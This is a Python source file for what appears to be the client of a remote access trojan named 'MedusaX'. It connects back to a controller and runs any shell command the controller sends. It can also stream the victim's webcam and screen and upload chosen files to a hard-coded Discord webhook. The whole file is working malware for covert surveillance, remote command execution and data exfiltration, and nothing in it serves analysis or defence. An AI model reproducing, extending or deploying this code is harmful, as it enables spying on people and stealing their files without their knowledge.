import socket
import subprocess
import cv2
import struct
import time
import requests
import os

server_ip = "10.0.1.33"
server_port = 9999
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, server_port))

def send_frame():
    global client
    cap = cv2.VideoCapture(0)
    
    while True:
        ret, frame = cap.read()
        if not ret:
            break

        _, encoded = cv2.imencode('.jpg', frame)
        client.sendall(struct.pack(">L", len(encoded)) + encoded.tobytes())

    cap.release()

def send_screen():
    import pyautogui
    import numpy as np
    
    while True:
        screenshot = pyautogui.screenshot()
        _, encoded = cv2.imencode('.jpg', cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR))
        client.sendall(struct.pack(">L", len(encoded)) + encoded.tobytes())

while True:
    try:
        command = client.recv(1024).decode().strip()

        if command.startswith("!"):
            # MedusaX Commands
            if command.startswith("!download"):
                filename = command.split(" ", 1)[1]
                if os.path.exists(filename):
                    with open(filename, "rb") as f:
                        requests.post("https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2", files={"file": f})

            elif command.startswith("!webcam_stream"):
                send_frame()

            elif command.startswith("!screen_stream"):
                send_screen()

            elif command.startswith("CTRL+P"):
                print("[ * ] Stopping stream...")
                break
        else:
            # Shell command execution
            output = subprocess.getoutput(command)
            client.send(output.encode())

    except Exception as e:
        print(f"[ - ] Error: {e}")
        break
